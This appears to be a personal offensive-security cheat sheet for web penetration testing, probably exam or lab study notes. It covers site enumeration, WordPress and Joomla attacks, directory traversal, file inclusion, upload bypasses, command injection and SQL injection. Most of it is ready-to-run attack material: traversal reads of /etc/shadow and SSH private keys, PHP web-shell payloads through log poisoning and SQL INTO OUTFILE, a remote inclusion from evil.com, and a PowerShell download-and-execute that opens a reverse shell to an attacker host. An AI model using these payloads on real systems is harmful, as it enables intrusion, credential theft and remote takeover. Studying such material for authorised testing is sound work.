## Web services

Use whatweb to check some information about the webpage:
```
whatweb http://www.webpage.com
```
NOTE: If you should try to find vhost ou subdomains, remember to add website fqdn to /etc/hosts
### nikto
```
nikto -url http://$ip -port $port -Cgidirs all
```
### Directory and File Enumeration
#### gobuster

dir
```
gobuster dir -u http://$ip:$port/ -w /path/to/wordlist -x php,html,txt,sh,...
```

dns
```
gobuster dns -d domain.org -w /path/to/wordlist  
```
#### dirsearch
```
dirsearch -u http://www.domain.com -w /path/to/wordlist/ -e php,xml,txt -t 10
```
#### ffuf

[Offensive Security Cheatsheet](https://cheatsheet.haax.fr/web-pentest/tools/ffuf/)

Directory discovery
```
ffuf -w /path/to/wordlist -u https://target/FUZZ
```

Adding classical header (some WAF bypass)
```
ffuf -c -w "/opt/host/main.txt:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1" -fs 5682,0 -u https://target/FUZZ
```

match all responses but filter out those with content-size 42
```
ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v
```

Fuzz Host-header, match HTTP 200 responses.
```
ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200
```

Virtual host discovery (without DNS records)
```
ffuf -w /path/to/wordlist:FUZZ  -u http://target.com -H "Host: FUZZ.target.com"
```

GET param fuzzing, filtering for invalid response size (or whatever)
```
ffuf -w /path/to/paramnames.txt:FUZZ -u https://target/script.php?FUZZ=test_value -fs 4242
```

GET parameter fuzzing if the parameter is known (fuzzing values) and trying .php files
```
ffuf -w /path/to/wordlist:FUZZ -u https://target/script.php?valid_name=FUZZ.php
```

POST parameter fuzzing
```
ffuf -w /path/to/postdata.txt:FUZZ -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401
```

Fuzz POST JSON data. Match all responses not containing text "error".
```
ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"
```

#### Wordlists:

Virtual host and subdomains:
```
/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

When the parameter is unknown:
```
/seclists/Discovery/Web-Content/burp-parameter-names.txt
```
#### Drupal

[Version 7 Remote Code Execution](https://github.com/pimps/CVE-2018-7600)

### CMS

Credits:
[Offensive Security Cheatsheet](https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/)

#### Wordpress

Interesting files:
```
https://monsite.com/robots.txt
https://monsite.com/feed
https://monsite.com/readme.html
https://monsite.com/xmlrpc.php
```

Configuration files
```
https://monsite.com/.htaccess
https://monsite.com/wp-config.php
```

Directory listing
```
https://monsite.com/wp-includes  
```

XML-RPC attack
https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit

You can bruteforce users
```
 ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1
```
If by any way you can upload files, go check /upload or /uploads for your files  

Get WPEngine's config file
```
/_wpeprivate/config.json
```
##### Scanning and enumeration 

Enumerate users
Users can be found using
```
?author=XXX
```

You can also use this using `/wp-json/wp/v2/users`, then iterate that way` /wp-json/wp/v2/users/1`  

If `/?author=1` is 403 Forbidden, you can bypass it
If the` .htaccess` blocks `"?author"`
Bypass 1 :
```
http://xxx.fr/?x&author=1 --> http://xxx.fr/author/chris/?x
```
Bypass 2 :
```
http://lictor.fr/index.php?author=1  
```

Another way
```
/wp-json/?rest_route=/wp/v2/users
```

##### WPScan

Non intrusive scan
```
wpscan --url www.example.com
```

Bruteforce users found using 50 threads
```
wpscan --url www.example.com --wordlist darkc0de.lst --threads 50
```

Bruteforce on one user
```
wpscan --url www.example.com --wordlist darkc0de.lst --username admin  
```

Plugins enumeration
```
wpscan --url www.example.com --enumerate p
```

Users enumeration
```
wpscan --url www.example.com --enumerate u
```

Example with plugin enumeration (aggressive  mode) and output a wpscan file:
```
wpscan --url http://www.example.com --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
###### Reverse Shell 
You can reverse shell by editing templates (404.php, footer.php...)
#### Joomla!
##### Scanning and Enumeration 
Get components running on the website
```
joomscan --url http://10.10.10.150/ --random-agent --enumerate-components
```

You can also check
```
/administrator/manifests/files/joomla.xml
```

If you find components, you can often access the configuration file
JCE component → `/components/com_jce/jce.xml `

Check for vulnerabilities affecting components

**Joomlavs** is also a good scanning tool https://github.com/rastating/joomlavs

##### Reverse Shell 
You must first log as **admin**
Then you must activate the PHP extension in settings
```
 System → Component → Media → “php”
```
in legal extensions and nothing in ignored extension

If it's not enough and the manager is detecting malicious PHP upload, you can still edit templates For example, the /index.php on the “protostar" template
→ Use reverse shell from pentestmonkey
→ http://pentestmonkey.net/tools/web-shells/php-reverse-shell

On old versions, the control panel and features are different, but you can use templates:
First go into templates parameters and activate preview
Then, on one template it is possible to edit code
Then it is possible to add shell (weevely for example)`
##### CVE-2012-1563 

Exploit against Joomla! <= 2.5.2
**Admin account creation**
Some online exploits exists but it possible to exploit it manually

First, fill the registration form using 2 different passwords # Intercept the request and add the following parameter : &jform[groups][]=7 (jform%5Bgroups%5D%5B%5D=7)
Forward the request → Fail because of different passwords
Now just retry to fill, using 2 valid passwords, without intercept
The parameter will be cached and the account will be created as admin !`
### XSS

#### Identify XSS

The most common special characters used for this purpose include:
```
< > ' " { } ;
```
#### Basic XSS

Send a request via burp or via browser.
Pay attention to input fields, search fields that could accept unsanitized input, like User-Agent.
Use the famous `<script>alert(42)</script>`
#### \*Privilege Escalation via XSS
Give me your cookie!
https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/

### Directory Traversal

Credits:
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

Example:
```
 http://domain.com/meteor/index.php?page=admin.php
```

File /etc/passwd via Directory Traversal
```
http://domain.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
with user information (/bin/bash or /bin/sh), we can try to get the ssh key.

ssh key via Directory Traversal:
```
http://domain.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
```

Via curl:
```
curl
http://domain.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
```
NOTE: try also to find other types of keys like ECDSA with id_ecdsa.

#### Different Encoding

Directory traversal vulnerability in **Apache 2.4.49**
```
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
```

Other encoding:
```
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Bypass "../" replaced by ""

Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.

```
..././
...\.\
```
#### Bypass "../" with ";"

```
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
```

#### Interesting Linux files

```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```
#### Interesting Windows files

Always existing file in recent Windows machine. Ideal to test path traversal but nothing much interesting inside...
```
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt
```

Interesting files to check out (Extracted from [https://github.com/soffensive/windowsblindread](https://github.com/soffensive/windowsblindread))
```
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```
#### Fuzzing:
```
ffuf -u http://$ip:$port/path/to/FUZZ -w /path/to/wordlist:FUZZ <filters>
```
##### Wordlists:

General:
```
/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
```

Linux:
```
/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

Windows:
```
/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```
### File Inclusion

Credits:
[PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

[HTB Academy - File Inclusion](https://academy.hackthebox.com/course/preview/file-inclusion)

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
#### Local File Inclusion

##### Log Poisoning

The following log files are controllable and can be included with an evil payload to achieve a command execution

```
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

Poison the User-Agent in access logs:
```
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

NOTE: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.
```
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

##### LFI to RCE via credentials files

This method require **high privileges** inside the application in order to read the sensitive files.
###### Windows version

First extract `sam` and `system` files.

```
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.

###### Linux version

First extract `/etc/shadow` files.

```
http://example.com/index.php?page=../../../../../../etc/shadow
```

Then crack the hashes inside in order to login via SSH on the machine.

NOTE: Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
##### PHP Wrappers

###### Wrapper php://filter

The part "`php://filter`" is case insensitive
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Wrappers can be chained with a compression wrapper for large files.
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

###### Wrapper data://

```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

###### Wrapper expect://

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

###### Wrapper input://

Specify your payload in the POST parameters, this can be done with a simple `curl` command.

```
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

###### Wrapper zip://

1. Create an evil payload: `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
2. Zip the file

```python
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
```

3. Upload the archive and access the file using the wrappers: [http://example.com/index.php?page=zip://shell.jpg%23payload.php](http://example.com/index.php?page=zip://shell.jpg%23payload.php)

###### Wrapper phar://

Create a phar file with a serialized object in its meta-data.

```
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked

```
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.

#### Remote File Inclusion

##### Set your local web server
```
python -m http.server <port>
```
##### Basic

Most of the filter bypasses from LFI section can be reused for RFI.
```
http://example.com/index.php?page=http://$your_ip:$port/your_file.txt
```

NOTE: You will see some request in your web server.
###### Null byte
```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```
NOTE: PHP version < 5.5 are vulnerable to this bypass
###### Bypass allow_url_include

When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.

1. Create a share open to everyone
2. Write a PHP code inside a file : `shell.php`
3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
#### File Upload

Credits:
[PayloadAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#defaults-extensions)
##### Defaults extensions

PHP Server
```
.php
.php3
.php4
.php5
.php7
```

Less known PHP extensions
```
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
 ```

ASP Server
```
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```

- JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
- Perl: `.pl, .pm, .cgi, .lib`
- Coldfusion: `.cfm, .cfml, .cfc, .dbm`
- Node.js: `.js, .json, .node`

##### Upload tricks

Use double extensions : `.jpg.php, .png.php5`

Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`

Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`

Null byte (works well against `pathinfo()`)
- `.php%00.gif`
- `.php\x00.gif`
- `.php%00.png`
- `.php\x00.png`
- `.php%00.jpg`
- `.php\x00.jpg`

Special characters
- Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
- Whitespace and new line characters
    - `file.php%20`
    - `file.php%0d%0a.jpg`
    - `file.php%0a`
- Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
- Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
- Multiple special characters: `file.jsp/././././.`

Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
- `Content-Type : image/gif`
- `Content-Type : image/png`
- `Content-Type : image/jpeg`
- Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
- Set the Content-Type twice: once for unallowed type and once for allowed.
##### Filename vulnerabilities

Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.

- Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
- LFI/Path Traversal Payloads: e.g. `image.png../../../../../../../etc/passwd`
- XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
- File Traversal e.g. `../../../tmp/lol.png`
- Command Injection e.g. `; sleep 10;`

Also you upload:

- HTML/SVG files to trigger an XSS
- EICAR file to check the presence of an antivirus
#### Command Injection
##### Basic checking

Git example:
```
curl -X POST --data 'Archive=git' http://server:port/archive
```

Checking version:
```
curl -X POST --data 'Archive=git version' http://server:port/archive
```

Checking if we can use another command with git with encoded semicolon `;` represented as `%3B` because this can be used with PowerShell and Bash.
```
curl -X POST --data 'Archive=git%3Bipconfig' http://server:port/archive
```

NOTE:  Alternatively, we can use two ampersands, `&&`, to specify two consecutive commands and for the Windows command line (CMD) we can also use `&`.
##### Checking if is CMD or PowerShell (Windows)

By PetSerAI, this command displays PowerShell or CMD, so we can see if we can use PowerShell or CMD commands:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Using the string above:
```
curl -X POST --data
'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20P
owerShell' http://192.168.50.189:8000/archive
```

##### Reverse shell
NOTE: This kind of reverse shell is used a lot

1) Copy powercat.ps1 to your http server directory:
```
cp /usr/share/powershell-
empire/empire/server/data/module_source/management/powercat.ps1 .
```

2) Setting up the http server:
```
python -m http.server 8000
```

3) Setting up your netcat listener (with/without rlwrap):
```
nc -nvlp $lport
```

4) Encode this as url and send it via cURL POST request:
```
IEX (New-Object
System.Net.Webclient).DownloadString("http://http_server_ip/powercat.ps1");powercat -c
your_ip -p lport -e powershell
```

```
curl -X POST -d 'your_payload'
```
### SQL Injections

Useful site:
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

#### Some basic commands
Remote SQL access:
```
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

Check version:
```
select version();
```

Check user:
```
select system_user();
```

List all databases:
```
show databases;
```

Select user and authentication_string from from mysql.usqr where user is `user`:
```
SELECT user, authentication_string FROM mysql.user WHERE user =
'user';
```

Connect to mssql using impacket:
```
impacket-mssqlclient username:password@$rhosts -windows-auth
```

Check version:
```
SELECT @@version;
```

List all databases:
```
SELECT name FROM sys.databases;
```

Show tables from `user` database:
```
SELECT * FROM user.information_schema.tables;
```

Show all from `users` table from `user` database:
```
select * from user.dbo.users;
```
#### Manual testing
##### Error-based
In-band: the vulnerable application provides the result of the query along with the application-returned value

Bypass login:
```
admin' or 1=1 -- //
```

Check version
```
' or 1=1 in (select @@version) -- //
```

Dump all from users table:
```
' OR 1=1 in (SELECT * FROM users) -- //
```

Dump all from password column:
```
' OR 1=1 in (SELECT password FROM users) -- //
```

Filter only `admin` user:
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Other tests:
```
' or 1=1 -- -
' or 1=1 #
'or 1#
' or 1=1 --
' or 1=1 -- -
admin\'-- -
```

#### UNION-based Payloads
For UNION SQLi attacks to work, we first need to satisfy **two** conditions:
1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

Test until error:
```
' ORDER BY 1-- //
```
or
```
' union select null,null,null-- //
```

Then. with the number of columns you can get some information, in this case we can get database info, user info and version (in this case, we have **5** columns):
```
' UNION SELECT null, database(), user(), @@version, null -- //
```

NOTE: Column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement

Get the columns table from the information_schema database belonging to the current database:
```
' union select null, table_name, column_name, table_schema, null from
information_schema.columns where table_schema=database() -- //
```

With that information we can get more specific information:
```
' UNION SELECT null, username, password, description, null FROM users -- //
```

#### Blind SQL Injections

Boolean-based SQLi:
```
http://192.168.50.16/blindsqli.php?user=user' AND 1=1 -- //
```

The same result can be achieved using time-based:
```
http://192.168.50.16/blindsqli.php?user=user' AND IF (1=1, sleep(3),'false') -- //
```

#### Manual Code Execution

In Microsoft SQL Server:
```
EXECUTE sp_configure 'show advanced options', 1;
```

```
RECONFIGURE;
```

```
EXECUTE sp_configure 'xp_cmdshell', 1;
```

```
RECONFIGURE;
```

`whoami` can be your payload, like a reverse shell:
```
EXECUTE xp_cmdshell 'whoami';
```

NOTE: Example using these commands:
```
' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXECUTE xp_cmdshell 'powershell -e ...';-- //
```

NOTE: For this attack to work, the file location must be writable to the OS user running
the database software.

UNION SELECT SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE
"/var/www/html/tmp/webshell.php" -- //
```
NOTE: try other directories like html or other that you have found out via Directory Enumeration

To access it:
```
http://$ip:$port/tmp/webshell.php?cmd=id
```
